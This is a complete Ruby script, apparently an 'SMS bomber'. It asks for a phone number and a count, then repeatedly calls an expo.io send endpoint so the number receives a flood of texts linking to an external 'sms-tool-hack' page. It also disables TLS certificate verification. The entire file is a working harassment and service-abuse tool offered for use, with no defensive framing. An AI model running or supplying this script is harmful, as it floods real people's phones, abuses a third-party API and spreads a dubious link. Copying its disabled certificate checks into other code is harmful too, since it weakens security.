require 'uri'
require 'net/http'
require 'openssl'

class SMS
	def initialize(phoneNumber)
		@count = 0
		link = "https://expo.io/--/api/send/%5B%22%2B#{phoneNumber.to_s}%22%2C%22http%3A%2F%2Fjust2day.ga%2Fsms-tool-hack.html%22%2Ctrue%5D"
		link = link.delete("\n")
		@url = URI(URI.parse(URI.encode(link)))
		@http = Net::HTTP.new(@url.host, @url.port)
		@http.use_ssl = true
		@http.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end

	def request()
		request = Net::HTTP::Get.new(@url)
		response = @http.request(request)
		@count = @count + 1
		puts ("SMS # " + @count.to_s)
	end

	def requestLoop(count)
		count = count.to_i
		begin
			request()
			count-=1
		end while count > 0
	end
end

print("Phone number: [Example:380970344343 , without '+'] => ")
phoneNumber = gets

print("SMS count: => ")
count = gets

sms_tool = SMS.new(phoneNumber)
sms_tool.requestLoop(count)
